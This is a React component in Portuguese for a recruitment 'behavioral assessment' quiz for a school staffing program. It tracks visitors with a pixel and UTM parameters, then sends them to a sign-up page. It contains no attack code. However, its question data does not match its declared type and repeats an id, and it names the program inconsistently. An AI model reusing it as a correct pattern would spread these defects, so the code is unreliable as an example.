import React, { useState } from 'react';
import { ArrowLeft, ArrowRight, CheckCircle } from 'lucide-react';
import useUtmNavigator from '../hooks/useUtmNavigator';
import { usePixelTracking } from '../hooks/usePixelTracking';

interface Question {
  id: number;
  question: string;
  options: string[];
}

const questions: Question[] = [
  {
    id: 1,
    question: "Qual é a importância da estabilidade profissional para você?",
    options: [
      "Muito importante - é uma prioridade na minha vida",
      "Importante - faz parte dos meus objetivos",
      "Pouco importante - não é uma prioridade"
    ]
      },
  {
    id: 1,
    question: "Ao receber orientações sobre procedimentos da escola, você:",
    context: "As rotinas escolares exigem que os colaboradores sigam orientações pedagógicas e administrativas com atenção.",
    options: [
      "Presta atenção e pergunta se tem dúvida",
      "Prefere aprender na prática",
      "Anota tudo e segue exatamente",
      "Escuta e tenta lembrar depois"
    ]
  },
  {
    id: 2,
    question: "Você estaria disposta a passar pelo treinamento gratuito do programa antes do início?",
    context: "O treinamento é oferecido gratuitamente e prepara o colaborador para atuar com segurança nas atividades escolares.",
    options: [
      "Depende da carga do curso",
      "Sim, com certeza",
      "Prefiro começar direto no trabalho",
      "Sim, se for em horário acessível"
    ]
  },
  {
    id: 3,
    question: "Você se vê contribuindo ativamente em um ambiente escolar com professores, funcionários e gestores?",
    context: "As equipes das escolas são compostas por profissionais de diversas áreas, trabalhando juntos pelo desenvolvimento dos alunos.",
    options: [
      "Dependeria da equipe",
      "Sim, já estou acostumada",
      "Nunca trabalhei em ambiente assim",
      "Sim, com boa comunicação"
    ]
  },
  {
    id: 4,
    question: "Você acredita que, com apoio e treinamento, pode se adaptar bem às rotinas escolares?",
    context: "O programa Escolas Conectadas oferece capacitação gratuita para todos os colaboradores, preparando-os para as funções nas escolas públicas.",
    options: [
      "Talvez, dependendo da função",
      "Sim, aprendo rápido com orientação",
      "Tenho receio com mudanças",
      "Sim, desde que tenha um início bem explicado"
    ]
  }
];

const BehavioralQuiz: React.FC = () => {
  usePixelTracking();
  
  const navigate = useUtmNavigator();
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [answers, setAnswers] = useState<Record<number, number>>({});
  const [selectedOption, setSelectedOption] = useState<number | null>(null);
  const [showCompletion, setShowCompletion] = useState(false);

  const handleOptionSelect = (optionIndex: number) => {
    setSelectedOption(optionIndex);
    setAnswers(prev => ({
      ...prev,
      [currentQuestion]: optionIndex
    }));
  };

  const handleNext = () => {
    if (currentQuestion < questions.length - 1) {
      setCurrentQuestion(prev => prev + 1);
      setSelectedOption(answers[currentQuestion + 1] ?? null);
    } else {
      // Quiz finalizado, mostrar página de conclusão
      navigate('/inscricao');
    }
  };

  const handleBack = () => {
    if (currentQuestion > 0) {
      setCurrentQuestion(prev => prev - 1);
      setSelectedOption(answers[currentQuestion - 1] ?? null);
    } else {
      navigate('/');
    }
  };

  const progress = ((currentQuestion + 1) / questions.length) * 100;
  const isLastQuestion = currentQuestion === questions.length - 1;

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white shadow-sm border-b">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">

            <div className="text-sm text-gray-600">
              Programa Agente Escola - Avaliação Comportamental
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-3xl mx-auto">
          <div className="rounded-lg border bg-white shadow-lg">
            <div className="flex flex-col space-y-1.5 p-6 text-center bg-[#1351B4] text-white">
              <h3 className="font-semibold tracking-tight text-2xl">Avaliação Comportamental</h3>
              <p className="text-blue-100 mt-2">
                Avaliação do perfil profissional para o Programa Agente Escola do Futuro
              </p>
            </div>

            <div className="p-8">
              <div className="mb-6">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-sm font-medium text-gray-600">
                    Pergunta {currentQuestion + 1} de {questions.length}
                  </span>
                  <span className="text-sm font-medium text-[#1351B4]">
                    {Math.round(progress)}% concluído
                  </span>
                </div>
                <div className="relative w-full overflow-hidden rounded-full bg-gray-200 h-2">
                  <div 
                    className="h-full bg-[#1351B4] transition-all duration-300"
                    style={{ width: `${progress}%` }}
                  />
                </div>
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-gray-800 mb-6 leading-relaxed">
                  {questions[currentQuestion].question}
                </h3>
                <div className="space-y-3">
                  {questions[currentQuestion].options.map((option, index) => (
                    <div
                      key={index}
                      onClick={() => handleOptionSelect(index)}
                      className={`p-4 rounded-lg border-2 cursor-pointer transition-all ${
                        selectedOption === index
                          ? 'border-[#1351B4] bg-blue-50'
                          : 'border-gray-200 hover:border-gray-300 hover:bg-gray-50'
                      }`}
                    >
                      <div className="flex items-center">
                        <div 
                          className={`w-4 h-4 rounded-full border-2 mr-3 ${
                            selectedOption === index
                              ? 'border-[#1351B4] bg-[#1351B4]'
                              : 'border-gray-300'
                          }`}
                        >
                          {selectedOption === index && (
                            <div className="w-full h-full rounded-full bg-white scale-50" />
                          )}
                        </div>
                        <span className="text-gray-700 flex-1">{option}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div className="flex justify-between items-center">
                <button
                  onClick={handleBack}
                  className="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-colors border bg-white hover:bg-gray-50 h-10 px-4 py-2 border-gray-300"
                >
                  <ArrowLeft size={16} />
                  {currentQuestion === 0 ? 'Voltar ao Início' : 'Pergunta Anterior'}
                </button>
                
                <button
                  onClick={handleNext}
                  disabled={selectedOption === null}
                  className="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-colors h-10 py-2 bg-[#1351B4] hover:bg-[#0C3D99] text-white px-6 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isLastQuestion ? 'Concluir Avaliação' : 'Próxima Pergunta'}
                  <ArrowRight size={16} />
                </button>
              </div>
            </div>
          </div>

          <div className="mt-6 text-center">
            <p className="text-sm text-gray-600">
              Esta avaliação ajuda a identificar a compatibilidade do seu perfil com as exigências do programa.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BehavioralQuiz;
